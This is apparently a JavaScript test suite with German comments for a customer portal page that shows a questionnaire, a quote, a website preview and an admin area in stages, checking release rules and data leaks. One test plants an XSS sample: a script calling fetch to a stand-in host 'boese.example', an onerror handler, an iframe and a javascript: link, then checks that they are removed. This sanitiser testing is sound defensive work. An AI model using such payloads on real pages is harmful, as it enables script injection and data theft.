/*
 * Der Kundenbereich hinter DEMSELBEN Fragebogen-Link.
 * ---------------------------------------------------------------------------
 * Die Kundschaft lernt genau eine Adresse: `fragebogen.html?e=<Einladung>`.
 * Sie wird nie ersetzt und nie erneuert — sie wächst. Was auf ihr steht,
 * entscheidet ausschliesslich der Datensatz, den Quantus veröffentlicht
 * (`stage` und `tiles`); diese Seite erfindet nichts dazu.
 *
 *   Stufe 1 · Fragebogen   immer: Kundendaten, Bestandesaufnahme, Vision Room.
 *   Stufe 2 · Offerte      erst wenn eine Offerte WIRKLICH versendet ist.
 *   Stufe 3 · Vorschau     erst mit freigegebener HTTPS-Adresse — dazu das
 *                          Formular für Änderungswünsche.
 *   Stufe 3 · Verwaltung   nur mit eigener Freigabe und nie ohne Vorschau.
 *
 * Bewiesen wird vor allem, was NICHT passieren darf: kein Entwurf nach aussen,
 * keine Kachel ohne Freigabe, kein leerer Platzhalter, keine Kontaktdaten,
 * keine Projekt-ID, kein Vertrag, keine AGB, kein Kundenportal — und keine
 * zweite Adresse.
 *
 * Die Logik wird wirklich ausgeführt: Der Skriptblock der Seite läuft gegen
 * das DOM-Doppel.
 */
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import vm from "node:vm";
import { fileURLToPath } from "node:url";
import { makeDom } from "./dom-double.mjs";

const root = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const page = fs.readFileSync(path.join(root, "fragebogen.html"), "utf8");
const script = /<script>([\s\S]*?)<\/script>/.exec(page)[1];

let checks = 0;
const ok = (condition, message) => { assert.ok(condition, message); checks++; };

const TOKEN = "e".repeat(30);
const IDS = [
  "loading", "error", "errorTitle", "errorText", "content", "title", "subtitle", "intro",
  "form", "fields", "hp", "submit", "need", "status", "footer",
  "answered", "answeredTitle", "answeredText", "area", "ck", "ckSide", "ckLock", "tileOffer", "tilePreview", "tileAdmin",
  "tileTerms", "tileTest", "tileContract",
  // Cockpit: Huelle, Umschalter, Sperrzustand und Aenderungsleiste.
  "ck", "ckViews", "ckProject", "ckMobil", "ckWish", "ckStage", "ckSide", "ckLock",
  "ckView_website", "ckView_verwaltung", "ckView_offerte", "ckView_agb", "ckView_fragebogen",
  "ckWishes", "crArea", "pvStage", "adminStage",
  "visionRoom", "vrLead", "visionRoomMount", "vrCarriers",
];

/* Die Seite laufen lassen — mit genau dem Datensatz, den Quantus liefert. */
async function seite(daten, { openDouble = null } = {}) {
  const dom = makeDom();
  IDS.forEach((id) => dom.ensure(id));
  // Ausgangslage wie im Markup: Diese Bereiche tragen dort `hidden`. Nur so
  // prüft der Test wirklich, dass die Seite sie öffnet — statt dass sie ohnehin
  // offen waren.
  ["error", "content", "answered", "area", "ck", "ckSide", "ckLock", "tileOffer", "tilePreview", "tileAdmin",
   "tileTerms", "tileTest", "tileContract", "visionRoom"]
    .forEach((id) => { dom.node(id).hidden = true; });
  const posted = [];
  const fetchDouble = (url, init) => {
    posted.push({ url, init });
    if (String(url).includes("intakeForms")) {
      return Promise.resolve({ ok: true, json: () => Promise.resolve(daten) });
    }
    return Promise.resolve({ ok: true, json: () => Promise.resolve({ ok: true }) });
  };
  dom.window.location.search = "?e=" + TOKEN;
  dom.window.fetch = fetchDouble;
  if (openDouble) dom.window.open = openDouble;
  const echtesGet = dom.document.getElementById;
  dom.document.getElementById = (id) => echtesGet(id) || (/^q_\d+$/.test(id) ? dom.ensure(id, "INPUT") : null);

  const ctx = {
    window: dom.window, document: dom.document, location: dom.window.location,
    setTimeout: dom.window.setTimeout, clearTimeout() {}, console,
    URLSearchParams, URL, Date, Number, String, Math, JSON, RegExp, Promise, Array, Object,
    fetch: fetchDouble,
  };
  ctx.globalThis = ctx;
  vm.runInContext(script, vm.createContext(ctx));
  await new Promise((r) => setTimeout(r, 0));
  return { dom, posted };
}

const FRAGEN = [
  { key: "name", label: "Ansprechperson", type: "text", role: "contactName", required: true, hint: "", options: [], vision: "" },
  { key: "email", label: "E-Mail", type: "email", role: "contactEmail", required: true, hint: "", options: [], vision: "" },
];

const basis = (extra) => Object.assign({
  schema: 1, title: "Ihre Angaben", intro: "Kurz ein paar Fragen.",
  status: "open", company: { name: "FlowerTech" }, generation: 1,
  questions: FRAGEN, stage: "intake",
  tiles: { offer: null, preview: null, admin: null },
  updatedAt: "2026-08-09T10:00:00.000Z",
}, extra || {});

const OFFERTE = {
  label: "Offerte", number: "OF-2026-001", title: "Website Lehner",
  amount: 4864.5, currency: "CHF", validUntil: "2026-09-30", expired: false,
  status: "sent", statusLabel: "Versendet", sentAt: "2026-08-08T09:00:00.000Z",
  document: { html: "<html><body><h1>Offerte OF-2026-001</h1><p>Website, 5 Seiten</p></body></html>", url: "" },
};
const VORSCHAU = {
  label: "Website-Vorschau & Änderungswünsche",
  url: "https://vorschau.lehner.ch/entwurf", releasedAt: "2026-08-09T08:00:00.000Z", feedback: true,
};
const VERWALTUNG = { label: "Verwaltung", url: "https://admin.lehner.ch/login", note: "Nur für die Pflege." };

/* Ein Bereich, der wartet: sichtbar, als wartend gekennzeichnet, mit
   Begruendung — und ohne jede Adresse oder Angabe aus dem Vorgang. Genau das
   trat an die Stelle des frueheren "gar nicht da". */
const zeige = (dom, key) => { const b = dom.node("ckView_" + key); if (b) b.click(); };

/* Eine Ansicht, die noch nicht bereit ist: Der zentrale Bereich traegt einen
   erklaerten Sperrzustand — inline, mittig, ohne leere Karte und ohne
   Adresse. Genau das trat an die Stelle des frueheren "gar nicht da". */
const wartet = (dom, key, knoten) => {
  zeige(dom, key);
  const lock = dom.node("ckLock");
  if (!lock || lock.hidden) return false;
  const html = String(lock.innerHTML || "");
  if (!/wird vorbereitet/i.test(html) || /https?:\/\//.test(html)) return false;
  // Und der zugehoerige Knoten steht nicht daneben.
  return !knoten || dom.node(knoten).hidden === true;
};

// Was die Kundschaft am Ende WIRKLICH vor sich hat: alles Gerenderte zusammen.
const sichtbar = (dom) => {
  // Das Cockpit zeigt immer nur EINE Ansicht. Fuer Leck-Pruefungen wird
  // deshalb durch alle geschaltet und alles Gerenderte eingesammelt.
  ["website", "verwaltung", "offerte", "agb", "fragebogen"].forEach((k) => zeige(dom, k));
  return alleKnoten(dom);
};
const alleKnoten = (dom) => IDS.map((id) => {
  const n = dom.node(id);
  if (!n || n.hidden) return "";
  return String(n.innerHTML || "") + " " + String(n.textContent || "");
}).join(" ");

/* ══ Stufe 1 ══════════════════════════════════════════════════════════════ */

// ── 1. Ohne Freigabe: erklaerter Wartezustand statt leerer Karte ──────────
{
  /* Frueher verschwand eine nicht freigegebene Stufe vollstaendig. Die
     Kundschaft konnte nicht wissen, dass es sie ueberhaupt gibt — und der
     Ablauf wirkte wie zwei verschiedene Anwendungen. Jetzt steht jeder
     Bereich da und erklaert, worauf er wartet. Ein LEERER Platzhalter bleibt
     trotzdem verboten: Jeder Wartezustand traegt Titel und Begruendung. */
  const { dom } = await seite(basis());
  ok(dom.node("content").hidden === false, "der Fragebogen wird nicht gezeigt");
  ok(dom.node("ck").hidden === false, "das Cockpit fehlt ganz");
  // Ohne Vorschau ist der Fragebogen die Startansicht.
  ok(dom.node("content").hidden === false, "der Fragebogen ist nicht die Startansicht");
  ok(dom.node("ckSide").hidden === true, "die Änderungsleiste steht ohne Vorschau da");
  // Die Umschalter tragen die vier Ansichten plus Fragebogen.
  const nav = String(dom.node("ckViews").innerHTML || "");
  ["Website", "Verwaltung", "Offerte", "AGB &amp; Kunde", "Fragebogen"].forEach((label) => {
    ok(nav.includes(label), `die Kopfzeile nennt „${label}“ nicht`);
  });
  // Kein Kachelband, keine gestapelten Artikel: Wer eine noch nicht bereite
  // Ansicht waehlt, bekommt den inline erklaerten Sperrzustand.
  ["website", "verwaltung", "offerte"].forEach((key) => {
    ok(wartet(dom, key), `die Ansicht ${key} erklärt den Sperrzustand nicht`);
  });
  ok(dom.node("answered").hidden === true, "der Hinweis für den erledigten Bogen steht schon da");
  ok(dom.node("error").hidden === true, "die Seite meldet einen Fehler");
  // Der Fragebogen selbst läuft unverändert.
  ok((dom.node("fields").innerHTML.match(/<label for="q_/g) || []).length === 2,
    "die Fragen werden nicht mehr gezeigt");
}

// ── 2. Ein Datensatz ganz ohne Kacheln (alter Stand) funktioniert weiter ──
{
  const alt = {
    schema: 1, title: "Ihre Angaben", intro: "Kurz ein paar Fragen.",
    status: "open", company: { name: "FlowerTech" }, questions: FRAGEN,
  };
  const { dom } = await seite(alt);
  ok(dom.node("content").hidden === false, "ein Datensatz ohne Kacheln zeigt den Fragebogen nicht mehr");
  /* Ein aelterer, schon veroeffentlichter Datensatz kennt `tiles` gar nicht.
     Fuer den bleibt es beim alten Verhalten — sonst behauptete eine alte
     Veroeffentlichung ploetzlich Stufen, die es zu ihrer Zeit nicht gab. */
  ok(dom.node("area").hidden === true, "ohne Kacheln entsteht trotzdem ein Bereich");
  ok(dom.node("ck").hidden === true, "ein alter Datensatz bekommt ein Cockpit");
  ok(dom.node("error").hidden === true, "ein Datensatz ohne Kacheln gilt als Fehler");
  ok(dom.node("title").textContent === "Ihre Angaben", "der Titel fehlt");
}

/* ══ Stufe 2 — die Offerte ════════════════════════════════════════════════ */

// ── 3. Ein Entwurf erreicht die Kundschaft nie ───────────────────────────
{
  const entwurf = Object.assign({}, OFFERTE, { status: "draft", statusLabel: "Entwurf" });
  const { dom } = await seite(basis({ stage: "offer", tiles: { offer: entwurf, preview: null, admin: null } }));
  ok(wartet(dom, "offerte", "tileOffer"), "ein Offerten-ENTWURF wird der Kundschaft gezeigt");
  ok(dom.node("ck").hidden === false, "das Cockpit fehlt beim Entwurf ganz");
  ok(!/OF-2026-001/.test(sichtbar(dom)), "die Nummer des Entwurfs steht auf der Seite");

  // Auch „versendet" ohne echten Versandzeitpunkt zählt nicht.
  const ohneVersand = Object.assign({}, OFFERTE, { sentAt: "" });
  const zweite = await seite(basis({ tiles: { offer: ohneVersand, preview: null, admin: null } }));
  ok(wartet(zweite.dom, "offerte", "tileOffer"),
    "eine Offerte ohne echten Versandzeitpunkt wird gezeigt");
}

// ── 4. Die versendete Offerte: Dokument, Betrag, Gültigkeit, Status ──────
{
  const { dom } = await seite(basis({ stage: "offer", tiles: { offer: OFFERTE, preview: null, admin: null } }));
  zeige(dom, "offerte");
  const kachel = dom.node("tileOffer");
  ok(kachel.hidden === false, "die versendete Offerte fehlt");
  ok(dom.node("area").hidden === false, "der Bereich bleibt zu");
  ok(/OF-2026-001/.test(kachel.innerHTML), "die Offertennummer fehlt");
  ok(/Website Lehner/.test(kachel.innerHTML), "der Titel der Offerte fehlt");
  // Schweizer Schreibweise mit Tausendertrenner — der Betrag muss lesbar sein.
  ok(/CHF 4\S?864\.50/.test(kachel.innerHTML.replace(/&#39;/g, "'")),
    `der Betrag fehlt oder ist unlesbar: ${kachel.innerHTML}`);
  ok(/gültig bis/.test(kachel.innerHTML), "die Gültigkeit fehlt");
  ok(/Versendet/.test(kachel.innerHTML), "der Status fehlt");
  ok(!/abgelaufen/.test(kachel.innerHTML), "eine gültige Offerte gilt als abgelaufen");

  // Das Dokument läuft eingesperrt: sandboxed iframe, kein allow-scripts.
  const rahmen = dom.node("offerDoc");
  ok(rahmen, "das Offertendokument wird nicht gezeigt");
  ok(/<iframe[^>]*\ssandbox(?=[\s>])/.test(kachel.innerHTML),
    "das Dokument läuft nicht in einem abgeschotteten Rahmen");
  ok(!/allow-scripts/.test(kachel.innerHTML), "im Dokumentrahmen dürfen Skripte laufen");
  ok(/OF-2026-001/.test(rahmen.srcdoc), "das Dokument ist leer");
  ok(dom.node("offerPrint"), "es gibt keinen Weg zu einem PDF");
  ok(/Drucken \/ als PDF speichern/.test(kachel.innerHTML), "der PDF-Weg ist nicht benannt");

  /* Stufe 1 bleibt erreichbar — aber sie dominiert den Bildschirm nicht mehr.
     Im Cockpit steht immer genau EINE Ansicht zentral; der Fragebogen ist ein
     Umschalter wie die anderen. */
  ok(dom.node("ckView_fragebogen"), "der Fragebogen ist nicht mehr erreichbar");
  zeige(dom, "fragebogen");
  ok(dom.node("content").hidden === false, "der Fragebogen lässt sich nicht mehr öffnen");
  zeige(dom, "offerte");
  ok(dom.node("content").hidden === true, "der Fragebogen steht weiterhin über der Offerte");
  ok(wartet(dom, "website", "tilePreview") && wartet(dom, "verwaltung", "tileAdmin"),
    "mit der Offerte erscheinen auch Vorschau oder Verwaltung");
}

// ── 5. Das Dokument wird ein zweites Mal entschärft ──────────────────────
{
  const boese = Object.assign({}, OFFERTE, {
    document: {
      html: '<html><body><h1>Offerte</h1><script>fetch("https://boese.example/klau")</script>'
        + '<img src=x onerror="alert(1)"><iframe src="https://boese.example"></iframe>'
        + '<a href="javascript:alert(2)">klick</a></body></html>',
      url: "",
    },
  });
  const geoeffnet = [];
  const fenster = {
    document: { write: (h) => geoeffnet.push(h), close() {} }, focus() {}, print() {},
  };
  const { dom } = await seite(basis({ tiles: { offer: boese, preview: null, admin: null } }),
    { openDouble: () => fenster });
  const html = dom.node("offerDoc").srcdoc;
  ok(/<h1>Offerte<\/h1>/.test(html), "das Dokument wurde ganz verworfen");
  ok(!/<script/i.test(html), "ein Skript überlebt im Offertendokument");
  ok(!/onerror/i.test(html), "ein Ereignis-Attribut überlebt im Offertendokument");
  ok(!/<iframe/i.test(html), "eine eingebettete fremde Seite überlebt im Offertendokument");
  ok(!/javascript:/i.test(html), "ein javascript:-Verweis überlebt im Offertendokument");

  // Auch der Druckweg bekommt ausschliesslich das entschärfte Dokument.
  dom.node("offerPrint").fire("click");
  ok(geoeffnet.length === 1, "der Druckweg öffnet kein Fenster");
  ok(!/<script/i.test(geoeffnet[0]) && !/onerror/i.test(geoeffnet[0]),
    "der Druckweg zeigt das ungefilterte Dokument");
}

// ── 6. Ist der Bogen beantwortet, bleibt der Bereich trotzdem stehen ─────
{
  const { dom } = await seite(basis({
    status: "answered", stage: "offer", tiles: { offer: OFFERTE, preview: null, admin: null },
  }));
  ok(dom.node("error").hidden === true, "die Seite meldet einen Fehler, obwohl es etwas zu sehen gibt");
  zeige(dom, "fragebogen");
  ok(dom.node("content").hidden === true, "der beantwortete Fragebogen lässt sich erneut ausfüllen");
  ok(dom.node("answered").hidden === false, "der Zustand wird nicht benannt");
  ok(/bei uns/.test(dom.node("answeredTitle").textContent),
    `der Zustand wird nicht freundlich benannt: ${dom.node("answeredTitle").textContent}`);
  ok(/derselben Adresse/.test(dom.node("answeredText").textContent),
    "es wird nicht gesagt, dass alles an derselben Adresse steht");
  zeige(dom, "offerte");
  ok(dom.node("tileOffer").hidden === false, "die Offerte verschwindet mit dem beantworteten Bogen");
  ok(dom.node("subtitle").textContent === "FlowerTech", "der Absender fehlt");
}

// ── 7. Ein abgeschlossener Bogen ohne Kacheln bleibt eine schlichte Notiz ─
{
  const { dom } = await seite(basis({ status: "closed" }));
  ok(dom.node("error").hidden === false, "ein abgeschlossener Bogen ohne Inhalt wird nicht benannt");
  ok(dom.node("ck").hidden === false, "ein abgeschlossener Bogen zeigt das Cockpit nicht");
  ok(dom.node("answered").hidden === true, "es steht eine Notiz da, obwohl es nichts zu sehen gibt");
}

/* ══ Stufe 3 — Vorschau, Änderungswünsche, Verwaltung ═════════════════════ */

// ── 8. Ohne Freigabe keine Vorschau, ohne HTTPS erst recht nicht ─────────
{
  const unsicher = Object.assign({}, VORSCHAU, { url: "http://vorschau.lehner.ch/entwurf" });
  const { dom } = await seite(basis({ tiles: { offer: null, preview: unsicher, admin: null } }));
  ok(wartet(dom, "website", "tilePreview"), "eine unverschlüsselte Vorschau-Adresse wird verlinkt");
  ok(!/vorschau\.lehner\.ch/.test(sichtbar(dom)), "die unsichere Adresse steht trotzdem auf der Seite");

  const leer = await seite(basis({ tiles: { offer: null, preview: null, admin: null } }));
  ok(wartet(leer.dom, "website", "tilePreview"), "ohne Freigabe erscheint eine Vorschau");
}

// ── 9. Die freigegebene Vorschau samt Änderungswunsch ────────────────────
{
  const { dom, posted } = await seite(basis({
    stage: "preview", tiles: { offer: null, preview: VORSCHAU, admin: null },
  }));
  zeige(dom, "website");
  const kachel = dom.node("tilePreview");
  ok(kachel.hidden === false, "die freigegebene Vorschau fehlt");
  /* Die Ansicht ist in der Kopfzeile benannt — in der Bühne steht die Website
     selbst. Eine eigene Überschrift wäre eine zweite Kopfzeile. */
  ok(!/<h2>/.test(kachel.innerHTML), "über der Vorschau steht wieder eine eigene Überschrift");
  /* Eingebettet wird die Website, nicht eine Hülle um sie herum: die Wurzel
     des Hosts, mit der Einbett-Absprache. */
  ok(/src="https:\/\/vorschau\.lehner\.ch\/\?embed=flowertech"/.test(kachel.innerHTML),
    "die Bühne zeigt nicht die Website selbst");
  ok(dom.node("previewOpen"), "es fehlt der Weg zur Vorschau");
  ok(kachel.innerHTML.includes('href="https://vorschau.lehner.ch/entwurf"'),
    "die Vorschau zeigt auf eine andere Adresse");
  ok(/rel="noopener noreferrer"/.test(kachel.innerHTML),
    "der Verweis gibt die Seite und den Token weiter");
  ok(/target="_blank"/.test(kachel.innerHTML), "die Vorschau ersetzt diese Seite");

  // Das Formular für Änderungswünsche.
  ok(dom.node("changeForm"), "es fehlt der Weg für Änderungswünsche");
  ok(dom.node("crHp"), "dem Formular fehlt der Honeypot");

  // Zu kurz: nichts geht raus.
  const vorher = posted.length;
  dom.node("crTitle").value = "x";
  dom.node("changeForm").fire("submit");
  await new Promise((r) => setTimeout(r, 0));
  ok(posted.length === vorher, "ein leerer Änderungswunsch wird gesendet");
  ok(/kurz beschreiben/.test(dom.node("crStatus").textContent), "es wird nicht erklärt, was fehlt");

  // Richtig ausgefüllt: genau eine Sendung, an denselben Eingang.
  dom.node("crTitle").value = "  Anderes Bild auf der Startseite  ";
  dom.node("crDetail").value = "Bitte eine Aussenaufnahme.";
  dom.node("crBy").value = "Rita Lehner";
  dom.node("changeForm").fire("submit");
  await new Promise((r) => setTimeout(r, 0));
  ok(posted.length === vorher + 1,
    `es wurden ${posted.length - vorher} Sendungen ausgelöst statt genau einer`);
  const call = posted[posted.length - 1];
  ok(/flowertech-portal/.test(call.url), `der Eingang stimmt nicht: ${call.url}`);
  const body = JSON.parse(call.init.body);
  ok(body.kind === "change", `die falsche Art wurde gesendet: ${body.kind}`);
  ok(body.token === TOKEN, "der Wunsch trägt nicht denselben Einladungstoken");
  ok(body.payload.title === "Anderes Bild auf der Startseite", "der Wunsch kommt ungetrimmt an");
  ok(body.payload.detail === "Bitte eine Aussenaufnahme.", "die Einzelheiten fehlen");
  ok(body.payload.requestedBy === "Rita Lehner", "die Absenderin fehlt");
  ok(/^ft_/.test(body.idempotencyKey), "der Wunsch ist nicht gegen Doppelklicks abgesichert");
  ok(!JSON.stringify(body).includes("projectId"), "im Versand steht eine Projekt-ID");
  ok(/angekommen/.test(dom.node("crStatus").textContent),
    `die Bestätigung fehlt: ${dom.node("crStatus").textContent}`);
  ok(dom.node("crTitle").value === "", "das Formular bleibt nach dem Senden gefüllt");

  // Derselbe Link, keine zweite Adresse: gelesen wurde genau einmal.
  ok(posted.filter((p) => String(p.url).includes("intakeForms")).length === 1,
    "die Seite holt ihren Stand mehrfach");
  ok(posted.every((p) => /^https:\/\//.test(String(p.url))), "es wird unverschlüsselt gesprochen");
}

// ── 10. Ohne geöffnete Rückmeldung gibt es kein Formular ────────────────
{
  const ohneFeedback = Object.assign({}, VORSCHAU, { feedback: false });
  const { dom } = await seite(basis({ tiles: { offer: null, preview: ohneFeedback, admin: null } }));
  ok(dom.node("tilePreview").hidden === false, "die Vorschau verschwindet ohne Rückmeldeweg");
  ok(dom.node("previewOpen"), "der Weg zur Vorschau fehlt");
  ok(!dom.node("changeForm"), "es entsteht ein Formular, obwohl die Rückmeldung nicht geöffnet ist");
}

// ── 11. Die Verwaltung: eigene Freigabe, nie vor der Vorschau ───────────
{
  const alleine = await seite(basis({ tiles: { offer: null, preview: null, admin: VERWALTUNG } }));
  ok(wartet(alleine.dom, "verwaltung", "tileAdmin"), "die Verwaltung erscheint ohne Vorschau");
  ok(!/admin\.lehner\.ch/.test(sichtbar(alleine.dom)),
    "die Verwaltungsadresse steht trotzdem auf der Seite");
  ok(alleine.dom.node("ck").hidden === false, "das Cockpit fehlt ganz");

  const zusammen = await seite(basis({
    stage: "preview", tiles: { offer: OFFERTE, preview: VORSCHAU, admin: VERWALTUNG },
  }));
  zeige(zusammen.dom, "verwaltung");
  const kachel = zusammen.dom.node("tileAdmin");
  ok(kachel.hidden === false, "die freigegebene Verwaltung fehlt");
  /* Die Freigabe entscheidet weiterhin, OB es die Verwaltung gibt — die
     Adresse selbst ist ein technisches Ziel und erreicht die Kundenseite
     nicht mehr. Gezeigt wird die Verwaltung im Kundenlink selbst. */
  ok(!/admin\.lehner\.ch/.test(kachel.innerHTML), "die Verwaltungsadresse steht auf der Seite");
  ok(!/<a\s/.test(kachel.innerHTML), "die Verwaltung führt aus dem Kundenlink hinaus");
  ok(/id="adminAreas"/.test(kachel.innerHTML), "die Verwaltung zeigt keine Bereiche");
  /* Alle Stufen auf EINER Adresse — im Cockpit aber nacheinander, nicht
     uebereinander gestapelt: jede Ansicht ersetzt die zentrale Flaeche. */
  [["tileOffer", "offerte"], ["tilePreview", "website"], ["tileAdmin", "verwaltung"]].forEach(([id, key]) => {
    zeige(zusammen.dom, key);
    ok(zusammen.dom.node(id).hidden === false, `auf der letzten Stufe fehlt ${id}`);
  });
  ok(!/http:\/\//.test(sichtbar(zusammen.dom)), "es steht eine unverschlüsselte Adresse auf der Seite");
}

/* ══ Keine Datenlecks ═════════════════════════════════════════════════════ */

// ── 12. Was nicht zur Kachel gehört, erreicht die Seite nicht ───────────
{
  // Ein absichtlich überfrachteter Datensatz: Selbst wenn irgendwann etwas
  // Falsches veröffentlicht würde, liest die Seite ausschliesslich die Felder,
  // die sie kennt.
  const { dom } = await seite(basis({
    stage: "preview",
    projectId: "prj_lehner",
    client: { company: "Lehner GmbH", email: "rita@lehner.ch", phone: "079 000 00 00" },
    contract: { body: "Vertragstext" },
    terms: { body: "AGB-Text" },
    notesInternal: "intern: Kundin zahlt spät",
    portalToken: "p".repeat(32),
    tiles: {
      offer: Object.assign({}, OFFERTE, {
        client: { email: "rita@lehner.ch" }, internalNote: "intern: Marge 40%",
        projectId: "prj_lehner",
      }),
      preview: Object.assign({}, VORSCHAU, { adminUrl: "https://geheim.lehner.ch/admin" }),
      admin: VERWALTUNG,
    },
  }));
  const alles = sichtbar(dom) + " " + String(dom.node("offerDoc").srcdoc || "");
  [
    ["prj_lehner", "die Projekt-ID"],
    ["rita@lehner.ch", "die Mailadresse der Kundschaft"],
    ["079 000 00 00", "die Telefonnummer"],
    ["Lehner GmbH", "die Firma der Kundschaft"],
    ["Vertragstext", "der Vertrag"],
    ["AGB-Text", "die AGB"],
    ["intern:", "eine interne Notiz"],
    ["p".repeat(32), "der Portaltoken"],
    ["geheim.lehner.ch", "eine nicht freigegebene Adresse"],
  ].forEach(([teil, was]) => {
    ok(!alles.includes(teil), `${was} steht auf der Kundenseite`);
  });
  // Der Einladungstoken steht im Link — aber nicht im Seiteninhalt.
  ok(!alles.includes(TOKEN), "der Einladungstoken wird auf der Seite ausgegeben");
}

/* ══ Quelltext: eine Adresse, ein Eingang ═════════════════════════════════ */

// ── 13. Kein zweiter Weg, keine zweite Seite ────────────────────────────
{
  ok(/data\.tiles/.test(page), "die Seite liest die Kacheln nicht aus dem Datensatz von Quantus");
  ok((page.match(/intakeForms/g) || []).length === 1, "es gibt mehr als eine Quelle");
  ok((page.match(/PORTAL_ENDPOINT/g) || []).length === 2,
    "es gibt mehr als einen Eingang (Aufruf und Konstante)");
  ok(!/fragebogen2|kundenbereich\.html|bereich\.html/.test(page),
    "es wurde eine zweite Adresse erfunden");
  ok(/OFFER_STATES/.test(page), "die Seite prüft den Versandstatus der Offerte nicht selbst");
  ok(/entschaerfen/.test(page), "das Offertendokument wird nicht zusätzlich entschärft");
  ok(/preview \? sicher\(renderAdmin/.test(page),
    "die Verwaltung hängt nicht an der sichtbaren Vorschau");
}

console.log(`kundenbereich: ok (${checks} Pruefungen)`);
